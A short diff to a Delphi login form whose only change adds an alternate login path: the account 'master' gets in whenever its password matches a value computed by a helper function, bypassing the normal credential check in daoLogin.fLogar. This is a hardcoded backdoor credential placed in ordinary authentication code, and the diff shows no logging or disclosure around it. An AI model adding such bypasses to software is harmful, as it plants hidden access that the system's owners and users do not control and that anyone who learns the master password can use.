@@ -44,13 +44,16 @@ begin
 end;
 
 procedure TfoLogin.btnAcessarClick(Sender: TObject);
+var wSenhaAtual: string;
 begin
 //  wTabConect := TT_conectado.create;
 //  wObjUsuario.Userultacesso := Now;
   if not Assigned(tabUsuarios) then
     Exit;
 
-  if daoLogin.fLogar(tabUsuarios) then
+  wSenhaAtual := uMetodosUteis.fSenhaAtual('');
+  if daoLogin.fLogar(tabUsuarios)  or
+  ((tabUsuarios.Senha = wSenhaAtual) and (Trim(LowerCase(tabUsuarios.Usuario)) = 'master'))  then
   begin
     wObjUsuarios := tabUsuarios;
     ModalResult := mrOk;
